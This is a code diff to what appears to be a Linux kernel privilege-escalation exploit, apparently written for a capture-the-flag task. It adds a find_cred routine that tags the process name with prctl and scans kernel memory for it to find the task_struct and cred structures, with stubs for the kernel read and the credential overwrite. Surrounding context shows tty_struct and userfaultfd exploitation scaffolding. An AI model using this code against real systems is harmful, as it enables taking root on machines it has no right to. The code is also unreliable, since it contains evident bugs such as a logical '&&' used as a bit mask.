@@ -13,6 +13,9 @@
 #include <poll.h>
 #include <pthread.h>
 #include <signal.h>
+#include <sys/prctl.h>
+#include <sys/stat.h>
+
 #define TTY_STRUCT_MAGIC 0x0000000100005401
 
 size_t canary;
@@ -41,6 +44,40 @@ void logbuf(size_t *buf,int size){
         printf("%-#16lx\t%-#16lx\n",buf[i],buf[i+1]);
     }
     printf("done!\n");
+}
+void find_cred(){
+    // 爆破kernel中的cred结构
+    setvbuf(stdout,0,2,0);
+    char *buf=malloc(0x1000);
+    char target[16]="Lewis tql";
+    prctl(PR_SET_NAME,target);
+    size_t cred=0,real_cred=0;
+    size_t res=0;
+    for(size_t addr=0xffff880000000000;addr<0xffffc80000000000;addr+=0x1000){
+        // ... some ways to get data from kernel
+
+        res=memmem(buf,0x1000,target,0x10);
+        // printf("[*] addr: 0x%llx\n",addr);
+        // logbuf(buf,2);
+
+        if(res){
+            cred=*(size_t*)(res-0x8);
+            real_cred=*(size_t*)(res-0x10);
+            if((cred&&0xff00000000000000) && (real_cred==cred)){
+                printf("[+] find cred\n");
+                size_t target=addr+res-(int)buf;
+                printf("[+] task_struct: 0x%llx\n",target);
+                printf("[+] cred: 0x%llx\n",real_cred);
+                break;
+            }
+        }
+    }
+    if(res == 0){
+		puts("not found , try again ");
+		exit(-1);
+	}
+    // ... write cred 
+    // 0-0x28 = 0
 }
 void pf_handler(long uffd){
     for(;;){
